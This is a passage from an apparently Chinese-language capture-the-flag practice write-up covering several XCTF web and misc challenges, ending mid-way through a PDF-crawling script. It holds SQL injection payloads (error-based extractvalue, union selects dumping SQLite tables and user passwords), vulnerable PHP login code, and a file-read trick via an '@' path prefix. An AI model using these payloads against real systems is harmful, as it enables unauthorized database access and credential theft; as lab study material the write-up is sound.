	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172451809_hu14908353755528327431.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120172451809_hu12505487710634917600.png 1024w"
	loading="lazy"
	
		alt="image-20250120172451809"
	
	
		class="gallery-image" 
		data-flex-grow="191"
		data-flex-basis="459px"
	
></p>
<p>ËøôËæπÁî®limitËØªÂèñËøòÊòØËØª‰∏çÂÖ®ÔºåÁî®substrÂàÜÂâ≤ËØªÂèñ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39;) and extractvalue(1,concat(0x7e,substr((select flag from flag),30,32),0x7e))#
</span></span></code></pre></td></tr></table>
</div>
</div><p>substrÂ∞±ÊòØÂèØ‰ª•substr(string,start,end)‰ªéstartÂºÄÂßãËØªÂèñÂà∞end</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120173404606.png"
	width="1498"
	height="755"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120173404606_hu7872013784237563096.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120173404606_hu1848372601070709402.png 1024w"
	loading="lazy"
	
		alt="image-20250120173404606"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="476px"
	
></p>
<p>ÊãºÊé•flag</p>
<h2 id="can_has_stdiomisc">can_has_stdio?Ôºàmisc)
</h2><p>ÊâìÂºÄÊñá‰ª∂ÊòØbrainfuck‰ª£Á†Å</p>
<p>Âú®Á∫øÁΩëÁ´ôhttp://esoteric.sange.fi/brainfuck/impl/interp/i.html</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120193046493.png"
	width="1709"
	height="564"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120193046493_hu5018088037902931136.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120193046493_hu4070163229326546591.png 1024w"
	loading="lazy"
	
		alt="image-20250120193046493"
	
	
		class="gallery-image" 
		data-flex-grow="303"
		data-flex-basis="727px"
	
></p>
<h2 id="glance-50misc">glance-50(misc)
</h2><p>gifÊãÜÂàÜÊãºÊé•</p>
<p>kaliÂëΩ‰ª§</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">convert glance.gif flag.png
</span></span><span class="line"><span class="cl">montage flag*.png -tile x1 -geometry +0+0 flag.png
</span></span><span class="line"><span class="cl">-tile ÊòØÊãºÊé•Êó∂ÊØèË°åÂíåÊØèÂàóÁöÑÂõæÁâáÊï∞ÔºåËøôÈáåÁî® x1ÔºåÂ∞±ÊòØÂè™‰∏ÄË°å
</span></span><span class="line"><span class="cl">-geometry ÊòØÈ¶ñÈÄâÊØè‰∏™ÂõæÂíåËæπÊ°ÜÂ∞∫ÂØ∏ÔºåÊàë‰ª¨ËæπÊ°Ü‰∏∫ 0ÔºåÂõæÁÖßÂéüÂßãÂ∞∫ÂØ∏Âç≥ÂèØ
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="miss_01misc">miss_01(misc)
</h2><p>‰∏¢010ÂèØËÉΩÊòØ‰º™Âä†ÂØÜ</p>
<p>Â∑•ÂÖ∑‰øÆÂ§ç</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175357997.png"
	width="1473"
	height="89"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175357997_hu4159377665941801152.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121175357997_hu1311981892199919718.png 1024w"
	loading="lazy"
	
		alt="image-20250121175357997"
	
	
		class="gallery-image" 
		data-flex-grow="1655"
		data-flex-basis="3972px"
	
></p>
<p>ÊâìÂºÄwordÊñá‰ª∂</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175728283.png"
	width="563"
	height="701"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175728283_hu13041505132673437048.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121175728283_hu1880409575722263144.png 1024w"
	loading="lazy"
	
		alt="image-20250121175728283"
	
	
		class="gallery-image" 
		data-flex-grow="80"
		data-flex-basis="192px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175750311.png"
	width="776"
	height="631"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175750311_hu3084155753423518674.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121175750311_hu6666133113468873917.png 1024w"
	loading="lazy"
	
		alt="image-20250121175750311"
	
	
		class="gallery-image" 
		data-flex-grow="122"
		data-flex-basis="295px"
	
></p>
<p>‰∏äÈù¢Ëøô‰∏™ÊòØrabbitÂä†ÂØÜ</p>
<p>rabbitÂä†ÂØÜÂêéÂ≠óÁ¨¶‰∏≤ÂºÄÂ§¥‰∏∫U2FsdGVkX1</p>
<p>ËÄå‰∏ãÈù¢Ëøô‰∏™ÈöêËóèÁöÑÊòØÂ∏åÂ∞îÂä†ÂØÜ</p>
<p><a class="link" href="https://tool.chinaz.com/tools/hill"  target="_blank" rel="noopener"
    >https://tool.chinaz.com/tools/hill</a></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121182502775.png"
	width="1040"
	height="1052"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121182502775_hu16333887920055571040.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121182502775_hu12823534784222332810.png 1024w"
	loading="lazy"
	
		alt="image-20250121182502775"
	
	
		class="gallery-image" 
		data-flex-grow="98"
		data-flex-basis="237px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121182552847.png"
	width="1040"
	height="1052"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121182552847_hu2996393364648348570.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121182552847_hu4239559374824955495.png 1024w"
	loading="lazy"
	
		alt="image-20250121182552847"
	
	
		class="gallery-image" 
		data-flex-grow="98"
		data-flex-basis="237px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121183324891.png"
	width="935"
	height="506"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121183324891_hu2572763224693502925.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121183324891_hu17907317339946677618.png 1024w"
	loading="lazy"
	
		alt="image-20250121183324891"
	
	
		class="gallery-image" 
		data-flex-grow="184"
		data-flex-basis="443px"
	
></p>
<p>ÁÑ∂ÂêéËß£ÂéãÈáåÈù¢ÁöÑÂéãÁº©ÂåÖÔºåÊâìÂºÄÈü≥È¢ëÊü•ÁúãÈ¢ëË∞±ÂõæËé∑Âæóflag</p>
<h2 id="wire1misc">Wire1(misc)
</h2><p>ÂØºÂá∫httpÂØπË±°ÔºåÊòØsqlÊ≥®ÂÖ•ÁöÑÂåÖÔºåÊü•ËØ¢ÊàêÂäüÂ∞±ÊòØ704Ôºå‰∏çÊàêÂäüÂ∞±ÊòØ720</p>
<p>Ê†πÊçÆÂ§ßÂ∞èÊéíÂ∫è</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121184609592.png"
	width="940"
	height="689"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121184609592_hu17020338885927752994.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121184609592_hu17448416472808042585.png 1024w"
	loading="lazy"
	
		alt="image-20250121184609592"
	
	
		class="gallery-image" 
		data-flex-grow="136"
		data-flex-basis="327px"
	
></p>
<p>Â∞ÜÂØπÂ∫îÁöÑasciiÁ†ÅËΩ¨‰∏∫Â≠óÁ¨¶</p>
<h2 id="catweb">Cat(web)
</h2><p>Áî®127.0.0.1ÊãºÊé•ÂêÑÁßçÂëΩ‰ª§ÈÉΩÊ≤°Áî®ÔºåÊÄÄÁñëË¢´ËøáÊª§‰∫Ü</p>
<p>Áî®bpÂØπfuzzÂ≠óÂÖ∏ÁàÜÁ†¥</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122183551210.png"
	width="1919"
	height="968"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122183551210_hu1183795812831734907.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122183551210_hu6560238747001257150.png 1024w"
	loading="lazy"
	
		alt="image-20250122183551210"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="475px"
	
></p>
<p>‰∏äÈù¢‰∏§‰∏™ÊúâË∂ÖÈïøÂõûÊòæ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122185638316.png"
	width="1596"
	height="774"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122185638316_hu11898284740000149204.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122185638316_hu9469126092054362816.png 1024w"
	loading="lazy"
	
		alt="image-20250122185638316"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="494px"
	
></p>
<p>html‰ª£Á†ÅÔºåÂ§çÂà∂Âá∫Êù•ÊµèËßàÂô®ÊâìÂºÄ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190104345.png"
	width="1605"
	height="86"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190104345_hu4835998192367401547.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122190104345_hu14043432356136970726.png 1024w"
	loading="lazy"
	
		alt="image-20250122190104345"
	
	
		class="gallery-image" 
		data-flex-grow="1866"
		data-flex-basis="4479px"
	
></p>
<p>djangoÊä•ÈîôÁïåÈù¢ÊúÄ‰∏ãÈù¢ÊúâËøô‰∏™true in your django settings file ÔºåÊü•Áúãsettings</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190336946.png"
	width="1814"
	height="869"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190336946_hu15123628349942452592.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122190336946_hu10666147684123806128.png 1024w"
	loading="lazy"
	
		alt="image-20250122190336946"
	
	
		class="gallery-image" 
		data-flex-grow="208"
		data-flex-basis="500px"
	
></p>
<p>Êü•ÁúãÊï∞ÊçÆÂ∫ìË∑ØÂæÑÔºåÁõ¥Êé•ÊêúÁ¥¢database</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190458948.png"
	width="1850"
	height="923"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190458948_hu5751479121880105247.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122190458948_hu6889823890465986258.png 1024w"
	loading="lazy"
	
		alt="image-20250122190458948"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="481px"
	
></p>
<p>ÊâæÂà∞Ë∑ØÂæÑ</p>
<p>ËøôÈáåÊúâ‰∏Ä‰∏™ÁÇπ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190615727.png"
	width="620"
	height="241"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190615727_hu12106056538369744971.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122190615727_hu17765066691262843433.png 1024w"
	loading="lazy"
	
		alt="image-20250122190615727"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<p>ÊÑèÊÄùÂ∞±ÊòØÂú®ÁªùÂØπË∑ØÂæÑÂâçÂä†@ÂèØ‰ª•ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@/opt/api/database.sqlite3
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êü•ËØ¢ÂêéÊêúÁ¥¢CTF</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190814243.png"
	width="699"
	height="140"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190814243_hu15632931947317867793.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122190814243_hu16434935261020771764.png 1024w"
	loading="lazy"
	
		alt="image-20250122190814243"
	
	
		class="gallery-image" 
		data-flex-grow="499"
		data-flex-basis="1198px"
	
></p>
<p>Âá∫Áé∞flag</p>
<h2 id="flatscience">FlatScience
</h2><p>ÁÇπÈìæÊé•Ê≤°‰∏úË•øÈÉΩÊòØËÆ∫ÊñáÔºåÊâ´ÁõÆÂΩï</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123163100170.png"
	width="1483"
	height="762"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123163100170_hu13942916939960795410.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123163100170_hu3257035148259456767.png 1024w"
	loading="lazy"
	
		alt="image-20250123163100170"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p>ÂèëÁé∞robots.txt</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123163129381.png"
	width="500"
	height="183"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123163129381_hu1858404508609769346.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123163129381_hu17632326688772476434.png 1024w"
	loading="lazy"
	
		alt="image-20250123163129381"
	
	
		class="gallery-image" 
		data-flex-grow="273"
		data-flex-basis="655px"
	
></p>
<p>Â∞±ÊòØ‰∏äÈù¢ÁöÑphpÊñá‰ª∂</p>
<p>Êúâ‰∏§‰∏™Ë¥¶Êà∑Ë¶ÅÊ±ÇÁôªÂÖ•ÊÄÄÁñëÊòØ‰∫åÊ¨°Ê≥®ÂÖ•ÔºåËØï‰∫Ü‰∏Ä‰∏ãÂèëÁé∞‰∏çÊòØ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123164200190.png"
	width="466"
	height="50"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123164200190_hu3491402588525810985.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123164200190_hu11713136735781840167.png 1024w"
	loading="lazy"
	
		alt="image-20250123164200190"
	
	
		class="gallery-image" 
		data-flex-grow="932"
		data-flex-basis="2236px"
	
></p>
<p>ËøôÈáå‰πüËØ¥‰∏çÁî®Â∞ùËØïÁªïËøáÁôªÂÖ•ÔºåÊàë‰ª¨ÂõûÂà∞login.php</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123164339804.png"
	width="487"
	height="280"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123164339804_hu5368968540710467121.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123164339804_hu3802773934475831926.png 1024w"
	loading="lazy"
	
		alt="image-20250123164339804"
	
	
		class="gallery-image" 
		data-flex-grow="173"
		data-flex-basis="417px"
	
></p>
<p>Ê∫êÁ†ÅÊúâÊèêÁ§∫Êàë‰ª¨Êü•Áúã?debugÁïåÈù¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;usr&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pw&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;usr&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pw&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQLite3</span><span class="p">(</span><span class="s1">&#39;../fancy.db&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&#34;SELECT id,name from Users where name=&#39;&#34;</span><span class="o">.</span><span class="nv">$user</span><span class="o">.</span><span class="s2">&#34;&#39; and password=&#39;&#34;</span><span class="o">.</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&#34;Salz!&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="na">fetchArray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;Some Error occourred!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">60</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;login.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ÄÊÆµphp‰ª£Á†Å,postË¶Å‰º†usrÂíåpwÔºåÂêéÈù¢sqlÊ≥®ÂÖ•Êü•ËØ¢‰ºöÊääpasswdËøõË°åsha1Âä†ÂØÜÔºåËøôÈáåÊòØsqlite3Êï∞ÊçÆÂ∫ì</p>
<p>Êúâ‰∏Ä‰∏™ÁÇπÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqliteÊï∞ÊçÆÂ∫ìÊúâ‰∏ÄÂº†sqlite_masterË°®Ôºå
</span></span><span class="line"><span class="cl">ÈáåÈù¢Êúâtype/name/tbl_name/rootpage/sqlËÆ∞ÂΩïÁùÄÁî®Êà∑ÂàõÂª∫Ë°®Êó∂ÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØ
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊµãËØï‰∫Ü‰∏Ä‰∏ãÊòØusrÂ≠òÂú®sqlÊ≥®ÂÖ•ÔºåsqlmapÂºÄÊâ´ÔºåÊâãÂ∑•Ê≥®ÂÖ•Â∞±ÊòØÈó≠Âêà‰∏∫1&rsquo; ÁÑ∂ÂêéËÅîÂêàÊ≥®ÂÖ•ÂæóÁªìÊûú</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; order by 3--+Êä•Èîô</span>
</span></span><span class="line"><span class="cl"><span class="err">Â∞±ÊòØ</span><span class="mi">2</span><span class="err">Â≠óÊÆµ</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,2--+</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; uniom select name,sql from sqlite_master--+</span>
</span></span><span class="line"><span class="cl"><span class="err">Êü•ËØ¢Âá∫ÁªìÊûú</span>
</span></span><span class="line"><span class="cl"><span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">Users</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="n">id</span> <span class="ne">int</span> <span class="n">primary</span> <span class="n">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="n">name</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="n">hint</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">Êü•ÁúãÂõõ‰∏™ÂàóË°®</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select id,group_concat(id) from users--+</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select id,group_concat(name) from users--+</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select id,group_concat(password) from users--+</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select id,group_concat(hint) from users--+</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>sqlmapÁàÜÊï∞ÊçÆÂ∫ìÂêçÊ≤°ÁªìÊûúÔºå‰ΩÜÊòØÊàë‰ª¨Áü•ÈÅì‰ªñÁöÑÊï∞ÊçÆÂ∫ìÂêç‰∏∫sqlite_master</p>
<p>ÁàÜÂá∫Ë°®Âêç‰∏∫Users,Áõ¥Êé•dumpÁªìÊûú</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123174514519.png"
	width="1133"
	height="246"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123174514519_hu6493971393447445320.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123174514519_hu16947135524442753337.png 1024w"
	loading="lazy"
	
		alt="image-20250123174514519"
	
	
		class="gallery-image" 
		data-flex-grow="460"
		data-flex-basis="1105px"
	
></p>
<p>Ê†πÊçÆhintÊàë‰ª¨ÁåúÊµãÂíåÂºÄÂ§¥ÈÇ£‰∏™ÁïåÈù¢ÁöÑpdfËÆ∫ÊñáÊúâÂÖ≥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3Áà¨ÂèñÂ§öÁõÆÊ†áÁΩëÈ°µPDFÊñá‰ª∂Âπ∂‰∏ãËΩΩÂà∞ÊåáÂÆöÁõÆÂΩï</span><span class="err">Ôºö</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">re1</span> <span class="o">=</span> <span class="s1">&#39;[a-fA-F0-9]{32,32}.pdf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">re2</span> <span class="o">=</span> <span class="s1">&#39;[0-9\/]{2,2}index.html&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pdf_list</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_pdf</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">pdf_list</span> 
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="n">re_1</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re1</span><span class="p">,</span><span class="n">req</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">re_1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pdf_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">pdf_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pdf_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">re_2</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re2</span><span class="p">,</span><span class="n">req</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">re_2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="n">j</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">get_pdf</span><span class="p">(</span><span class="n">new_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pdf_list</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># return re_2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pdf_list</span> <span class="o">=</span> <span class="n">get_pdf</span><span class="p">(</span><span class="s1">&#39;http://61.147.171.105:60837/&#39;</span><span class="p">)</span>
